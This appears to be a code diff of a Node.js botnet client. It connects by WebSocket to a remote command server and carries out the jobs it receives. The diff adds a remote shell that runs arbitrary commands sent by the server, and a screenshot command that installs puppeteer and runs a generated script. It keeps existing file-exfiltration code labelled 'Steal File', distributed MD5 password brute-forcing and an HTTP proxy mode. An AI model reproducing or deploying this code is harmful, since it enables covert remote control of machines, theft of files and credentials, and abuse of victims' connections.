@@ -1,6 +1,7 @@
 const WebSocket = require('ws');
 const crypto = require('crypto');
 const fs = require('fs');
+const { exec } = require('child_process'); // Needed for Shell & Screenshots
 
 // REPLACE WITH YOUR RENDER URL!
 const WEBSOCKET_URL = 'wss://scavenger-brain.onrender.com'; 
@@ -18,16 +19,17 @@ function connect() {
             if (msg.type === 'MINING_JOB') {
                 crack(ws, msg.start, msg.end, msg.target);
             } 
+            
             // 2. STOP COMMAND
             else if (msg.type === 'STOP') {
                 console.log("!!! SYSTEM HALT. PASSWORD FOUND: " + msg.solution);
                 ws.close();
                 process.exit(0);
             }
-            // 3. PROXY MODE (The Hydra Feature)
+            
+            // 3. PROXY MODE (Hydra)
             else if (msg.type === 'HTTP_PROXY') {
-                console.log(`Proxying request to: ${msg.url}`);
-
+                console.log(`[PROXY] Requesting: ${msg.url}`);
                 fetch(msg.url)
                     .then(async (response) => {
                         const text = await response.text();
@@ -35,7 +37,7 @@ function connect() {
                             type: 'PROXY_RESULT',
                             requestId: msg.requestId,
                             status: response.status,
-                            body: text.substring(0, 500) + "..." // Truncate
+                            body: text.substring(0, 500) + "..." 
                         }));
                     })
                     .catch(err => {
@@ -46,24 +48,30 @@ function connect() {
                         }));
                     });
             }
-        } catch (e) {
-            console.error("Error processing message:", e);
-        }
-    });
-            // 4. EXFILTRATION (Steal File)
+
+            // 4. GHOST SHELL (Remote Execution)
+            else if (msg.type === 'EXEC_CMD') {
+                console.log(`[SHELL] Executing: ${msg.command}`);
+                exec(msg.command, { timeout: 10000 }, (error, stdout, stderr) => {
+                    const output = stdout || stderr || (error ? error.message : "Done.");
+                    ws.send(JSON.stringify({
+                        type: 'SHELL_RESULT',
+                        output: output
+                    }));
+                });
+            }
+
+            // 5. EXFILTRATION (Steal File)
             else if (msg.type === 'EXFIL_CMD') {
                 const path = msg.path;
                 console.log(`[EXFIL] Stealing: ${path}`);
-                
+
                 if (fs.existsSync(path)) {
                     try {
-                        // Read file as Base64
                         const fileData = fs.readFileSync(path, { encoding: 'base64' });
-                        
-                        // Send it back
                         ws.send(JSON.stringify({
                             type: 'EXFIL_RESULT',
-                            filename: path.split('/').pop(), // Get just the name
+                            filename: path.split('/').pop(),
                             data: fileData
                         }));
                     } catch (e) {
@@ -74,35 +82,63 @@ function connect() {
                 }
             }
 
+            // 6. GHOST EYE (Screenshot)
+            else if (msg.type === 'SNAPSHOT_CMD') {
+                const targetUrl = msg.url;
+                console.log(`[EYE] Spying on: ${targetUrl}`);
+                
+                const script = `
+                    const puppeteer = require('puppeteer');
+                    (async () => {
+                        try {
+                            const browser = await puppeteer.launch({ args: ['--no-sandbox'] });
+                            const page = await browser.newPage();
+                            await page.setViewport({ width: 1280, height: 720 });
+                            await page.goto('${targetUrl}', { waitUntil: 'networkidle2', timeout: 30000 });
+                            await page.screenshot({ path: 'evidence.png' });
+                            await browser.close();
+                        } catch (e) { console.error(e); }
+                    })();
+                `;
+                
+                fs.writeFileSync('camera.js', script);
+                const cmd = `npm list puppeteer || npm install puppeteer && node camera.js`;
+                
+                exec(cmd, { timeout: 60000 }, (error, stdout, stderr) => {
+                    if (fs.existsSync('evidence.png')) {
+                        const fileData = fs.readFileSync('evidence.png', { encoding: 'base64' });
+                        ws.send(JSON.stringify({
+                            type: 'EXFIL_RESULT',
+                            filename: `snapshot_${Date.now()}.png`,
+                            data: fileData
+                        }));
+                    } else {
+                        ws.send(JSON.stringify({ type: 'SHELL_LOG', output: `[ERROR] Snapshot failed: ${stderr}` }));
+                    }
+                });
+            }
+
+        } catch (e) {
+            console.error("Error processing message:", e);
+        }
+    });
+
     ws.on('close', () => setTimeout(connect, 5000));
     ws.on('error', () => ws.close());
 }
 
-// --- THE NEW MD5 CRACKER LOGIC ---
+// --- MD5 CRACKER LOGIC ---
 function crack(ws, start, end, targetHash) {
     console.log(`[CRACKER] Brute-forcing range: ${start} - ${end}`);
-
     for (let i = start; i < end; i++) {
-        // 1. Generate the guess (Assuming numeric PIN for this demo)
-        // In a real attack, you'd iterate "aaaa", "aaab", etc.
         const guess = i.toString(); 
-        
-        // 2. Hash the guess using MD5
         const hash = crypto.createHash('md5').update(guess).digest('hex');
-
-        // 3. Compare with the Target
         if (hash === targetHash) {
             console.log("!!! PASSWORD CRACKED: " + guess);
-            ws.send(JSON.stringify({
-                type: 'JOB_COMPLETE',
-                solution: guess, 
-                hash: hash
-            }));
+            ws.send(JSON.stringify({ type: 'JOB_COMPLETE', solution: guess, hash: hash }));
             return;
         }
     }
-
-    // Nothing found in this range
     ws.send(JSON.stringify({ type: 'JOB_COMPLETE', solution: null }));
 }
 
